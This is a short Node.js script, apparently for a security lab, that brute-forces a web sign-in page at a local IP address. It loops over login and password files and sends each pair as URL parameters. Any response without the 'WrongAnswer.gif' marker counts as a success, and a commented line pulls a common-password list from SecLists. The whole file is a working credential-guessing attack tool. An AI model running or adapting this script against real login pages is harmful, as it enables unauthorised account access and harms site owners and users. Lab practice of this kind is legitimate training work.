import { readFile } from 'node:fs/promises';

const loginsFile = 'logins';
const passwordsFile = 'passwords';

const  getUrl = (ip, login, password) => `http://${ip}/?page=signin&username=${login}&password=${password}&Login=Login#`;

// const getPasswords = async (passUrl) => {
//      try {
//         const page = await fetch(passUrl);
//         const rawTextPage = await page.text();
//         return rawTextPage.split("\n");
//     } catch (error) {
//         console.error('ERROR FETCH (getPasswords) ', error)
//     }
// }

const testSuccess = async (url) => {
    try {
        console.log(`try ${url}`)
        const response = await fetch(url);
        const text = await response.text();
        return !text.includes('WrongAnswer.gif');
    } catch (error) {
        console.error('error fetch (testSuccess): ', error)
    }
}

async function bruteForce(logins, passwords, ip) {    
    let successResults = [];

    for (let login = 0; login < logins.length; login++) {
        for (let pass = 0; pass < passwords.length; pass++) {
            const isSuccess = await testSuccess(getUrl(ip, logins[login], passwords[pass]));
            if (isSuccess) {
                successResults.push({login:logins[login], password: passwords[pass] }) 
            }
        }
    }
    return successResults;
}

async function main() {
    const logins = (await readFile(loginsFile, 'utf8')).split(/\r?\n/);
    const passwords = (await readFile(passwordsFile, 'utf8')).split(/\r?\n/);
    const ip =  '192.168.0.199:80';
    // const passwords = await getPasswords('https://raw.githubusercontent.com/danielmiessler/SecLists/master/PasswordCommon-Credentials/10k-most-common.txt');

    if (!logins || !passwords) {
        console.log('error: no test data')
        return;
    }
    return await bruteForce(logins, passwords, ip);
}

console.log(await main());
